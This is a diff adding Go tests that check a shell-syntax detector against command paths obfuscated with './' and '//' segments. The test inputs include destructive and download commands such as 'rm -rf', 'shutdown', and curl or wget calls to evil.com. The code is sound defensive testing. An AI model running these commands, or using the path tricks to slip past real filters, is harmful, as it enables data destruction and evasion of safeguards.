@@ -121,4 +121,29 @@ func TestContainsShellSyntax(t *testing.T) {
 		assert.True(t, containsShellSyntax("/sbin/shutdown -h now", "shutdown"))
 		assert.True(t, containsShellSyntax("/usr/local/bin/wget http://evil.com", "wget"))
 	})
+
+	t.Run("it detects non-canonical paths with dot components", func(t *testing.T) {
+		// Test paths with . components that should be normalized
+		assert.True(t, containsShellSyntax("/bin/./rm -rf /tmp/x", "/bin/./rm"))
+		assert.True(t, containsShellSyntax("/bin/./rm -rf /tmp/x", "/bin/./rm"))
+		assert.True(t, containsShellSyntax("/usr/./bin/curl http://evil.com", "/usr/./bin/curl"))
+		assert.True(t, containsShellSyntax("/sbin/././shutdown -h now", "/sbin/././shutdown"))
+		assert.True(t, containsShellSyntax("/usr/local/./bin/wget http://evil.com", "/usr/local/./bin/wget"))
+	})
+
+	t.Run("it detects non-canonical paths with redundant separators", func(t *testing.T) {
+		// Test paths with // that should be normalized
+		assert.True(t, containsShellSyntax("/bin//rm -rf /tmp/x", "/bin//rm"))
+		assert.True(t, containsShellSyntax("/usr//bin//curl http://evil.com", "/usr//bin//curl"))
+		assert.True(t, containsShellSyntax("/sbin///shutdown -h now", "/sbin///shutdown"))
+		assert.True(t, containsShellSyntax("/usr/local//bin/wget http://evil.com", "/usr/local//bin/wget"))
+	})
+
+	t.Run("it detects non-canonical paths with mixed dot and redundant separators", func(t *testing.T) {
+		// Test paths with both . and // that should be normalized
+		assert.True(t, containsShellSyntax("/bin/./rm -rf /tmp/x", "/bin/./rm"))
+		assert.True(t, containsShellSyntax("/bin//./rm -rf /tmp/x", "/bin//./rm"))
+		assert.True(t, containsShellSyntax("/usr/.//bin/curl http://evil.com", "/usr/.//bin/curl"))
+		assert.True(t, containsShellSyntax("/sbin//.//shutdown -h now", "/sbin//.//shutdown"))
+	})
 }
